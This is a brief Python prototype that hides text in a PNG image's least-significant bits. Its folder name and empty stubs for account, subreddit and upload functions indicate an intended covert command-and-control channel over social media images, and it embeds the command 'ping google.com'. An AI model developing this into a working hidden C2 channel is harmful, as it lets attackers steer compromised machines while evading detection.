import requests
import base64
from PIL import Image
import numpy as np

# encode text
text = "Hello world"
image_path = "server/forest.png"


def write_message_to_image(text,image_path):
    # converts text to binary and concats into an array full of ints
    binary_message = "".join([bin(letter)[2:].zfill(8) for letter in text.encode("utf-8")])
    binary_message = [int(i) for i in binary_message]

    binary_message_len = len(binary_message)

    #get image pixels as array
    with Image.open(image_path) as img:
        width,height = img.size
        data = np.array(img)

    # flatten pixel array
    data = np.reshape(data, width*height*3)

    #overwrite lsb
    data[:binary_message_len] = (data[:binary_message_len] & 254) | binary_message

    #reshape back into image pixel array
    data = np.reshape(data, (height, width, 3))

    # reconstruct image
    new_img = Image.fromarray(data)
    new_img.save(image_path)
    return True # means success and that the rest of the program can carry on.

# Mot sure if this func is needed 
# but may be in the future.
def create_account():
    pass

def create_subreddit():
    pass

def upload_to_subreddit():
    pass

write_message_to_image("ping google.com", "/home/mikolaj/Documents/python/twitter_c2/server/forest.png")